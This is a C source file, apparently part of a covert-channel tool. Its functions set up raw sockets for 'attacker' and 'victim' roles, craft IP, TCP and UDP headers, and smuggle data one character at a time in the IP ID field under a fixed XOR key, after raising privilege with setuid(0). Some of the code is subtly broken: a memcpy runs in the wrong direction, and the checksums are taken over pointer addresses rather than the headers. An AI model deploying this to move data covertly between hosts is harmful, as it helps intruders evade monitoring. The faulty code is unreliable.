#include "common.h"
#include "extern.h"

pid_t pid;

void program_setup(void) {
    /* change the UID/GID to 0 (raise privilege) */
    setuid(0);
    setgid(0);
}


unsigned short hide_data(unsigned short ch) {
    uint16_t key = 0xABCD;
    return ch ^ key;
}


void sig_handler(int signum) {
    //Return type of the handler function should be void
    pid = getpid();
    printf("Ctrl + C pressed\n Exit program \n");
    kill(pid, SIGUSR1);
}


unsigned int host_convert(char *hostname) {
    static struct in_addr i;
    struct hostent *h;
    i.s_addr = inet_addr(hostname);
    if(i.s_addr == -1)
    {
        h = gethostbyname(hostname);
        if(h == NULL)
        {
            fprintf(stderr, "cannot resolve %s\n", hostname);
            exit(0);
        }
        memcpy(h->h_name, (char *)&i.s_addr, (unsigned long) h->h_length);
    }
    return i.s_addr;
}


uint16_t calculate_checksum(void *header, int header_size) {
    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t *)header;

    while (header_size > 1) {
        sum += *ptr++;
        header_size -= 2;
    }

    if (header_size > 0) {
        sum += *(uint8_t *)ptr;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)~sum;
}


void check_root_user(void) {
    if(geteuid() != 0) {
        printf("\nYou need to be root to run this.\n\n");
        exit(0);
    }
}


void create_socket(void *arg, char flag, char protocol, char* ip, uint16_t port) {
    int enable = 1;

    if (flag == 'A') {
        struct options_attacker *opts = (struct options_attacker*)arg;
        if (protocol == 'U') {
            opts->udp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (opts->udp_socket == -1) {
                perror("attacker udp socket() ERROR\n");
                exit(EXIT_FAILURE);
            }
            opts->udpsa.sin_family = AF_INET;
            opts->udpsa.sin_port = htons(port);
            opts->udpsa.sin_addr.s_addr = inet_addr(ip);
        }
        if (protocol == 'T') {
            opts->tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (opts->tcp_socket == -1) {
                perror("attacker tcp socket() ERROR\n");
                exit(EXIT_FAILURE);
            }
            opts->tcpsa.sin_family = AF_INET;
            opts->tcpsa.sin_port = htons(port);
            opts->tcpsa.sin_addr.s_addr = inet_addr(ip);
        }

        if (setsockopt(opts->udp_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
            perror("Error setting IP_HDRINCL option");
            exit(EXIT_FAILURE);
        }
    }

    if (flag == 'V') {
        struct options_victim *opts = (struct options_victim*)arg;
        if (protocol == 'U') {
            opts->udp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (opts->udp_socket == -1) {
                perror("attacker udp socket() ERROR\n");
                exit(EXIT_FAILURE);
            }
            opts->udpsa.sin_family = AF_INET;
            opts->udpsa.sin_port = htons(port);
        }
        if (protocol == 'T') {
            opts->tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (opts->tcp_socket == -1) {
                perror("attacker tcp socket() ERROR\n");
                exit(EXIT_FAILURE);
            }
            opts->tcpsa.sin_family = AF_INET;
            opts->tcpsa.sin_port = htons(port);
        }
    }
}


unsigned short create_udp_header(struct udphdr* uh, uint16_t sport, uint16_t dport) {
    uh->source = htons(sport);
    uh->dest = htons(dport);
    uh->len = htons(sizeof(struct udphdr));
    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));

    return sizeof(struct udphdr);
}


unsigned short create_tcp_header(struct tcphdr* th, uint16_t sport, uint16_t dport) {
    th->source = htons(sport);
    th->dest = htons(dport);
    th->seq = htonl(1);
    th->ack_seq = htonl(0);
    th->doff = 10;
    th->fin = 0;
    th->syn = 1;
    th->rst = 0;
    th->psh = 0;
    th->ack = 0;
    th->urg = 0;
    th->check = calculate_checksum(&th, sizeof(struct tcphdr));
    th->window = htons(5840);
    th->urg_ptr = 0;

    return sizeof(struct tcphdr);
}


unsigned short create_ip_header(struct iphdr* ih, void *arg, char flag, char c, char protocol) {
    if (flag == 'A') {
        struct options_attacker *opts = (struct options_attacker*)arg;
        ih->saddr = host_convert(opts->my_ip);
        ih->daddr = host_convert(opts->dest_ip);
    }
    if (flag == 'V') {
        struct options_victim *opts = (struct options_victim*)arg;
        ih->saddr = host_convert(opts->my_ip);
        ih->daddr = host_convert(opts->dest_ip);
    }
    ih->ihl = 5;
    ih->version = 4;
    ih->tos = 0;
    ih->id = htons(hide_data((uint16_t)c));
    ih->tot_len = htons(28);
    ih->ttl = 64;
    ih->frag_off = 0;
    if (protocol == 'T') ih->protocol = IPPROTO_TCP;
    if (protocol == 'U') ih->protocol = IPPROTO_UDP;
    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));

    return sizeof(struct iphdr);
}

